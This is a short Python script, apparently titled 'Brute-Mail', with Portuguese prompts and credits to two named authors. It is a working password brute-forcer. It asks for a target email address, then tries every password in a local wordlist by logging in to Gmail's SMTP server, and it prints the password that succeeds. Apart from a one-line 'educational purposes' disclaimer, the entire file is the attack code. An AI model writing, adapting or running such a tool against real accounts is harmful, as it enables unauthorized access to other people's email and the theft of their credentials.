#!/usr/bin/env python 
# -*- coding: utf-8 -*-

import smtplib
import email.utils

print(''' 

 $$$$$$$\                        $$\                                   $$\      $$\           $$\ $$\ 
 $$  __$$\                       $$ |                                  $$$\    $$$ |          \__|$$ |
 $$ |  $$ | $$$$$$\  $$\   $$\ $$$$$$\    $$$$$$\                      $$$$\  $$$$ | $$$$$$\  $$\ $$ |
 $$$$$$$\ |$$  __$$\ $$ |  $$ |\_$$  _|  $$  __$$\       $$$$$$\       $$\$$\$$ $$ | \____$$\ $$ |$$ |
 $$  __$$\ $$ |  \__|$$ |  $$ |  $$ |    $$$$$$$$ |      \______|      $$ \$$$  $$ | $$$$$$$ |$$ |$$ |
 $$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\ $$   ____|                    $$ |\$  /$$ |$$  __$$ |$$ |$$ |
 $$$$$$$  |$$ |      \$$$$$$  |  \$$$$  |\$$$$$$$\                     $$ | \_/ $$ |\$$$$$$$ |$$ |$$ |
 \_______/ \__|       \______/    \____/  \_______|                    \__|     \__| \_______|\__|\__|
                                                                                                     

 x---------------------------------x
 | By: Loock Underwood e B. Rudsen |
 x---------------------------------x ''')
                                                                                                  


print('\n - OBS: O Programa só funciona caso o E-mail alvo esteja com a opção Loguin com App Desconhecidos ON.')
print('\n - OBS: Script feito para "Fins Educativos".')

####################################################################################

user = input('\n - Digite aqui o E-mail alvo: ')
arquivo = open("lista.txt", "r")
for linha in arquivo.readlines():
	try:
		smtpclient = smtplib.SMTP('smtp.gmail.com', 587)
		smtpclient.ehlo()
		smtpclient.starttls()
		linha = linha.strip()
		smtpclient.login(user, linha)

		print('\n [!] Senha Encontrada: %s' % linha)
		print('-----------------------------------')
	except:
	        print('\n [-] Senha Incorreta: %s' % linha)
	        print('-----------------------------------')
		
	    
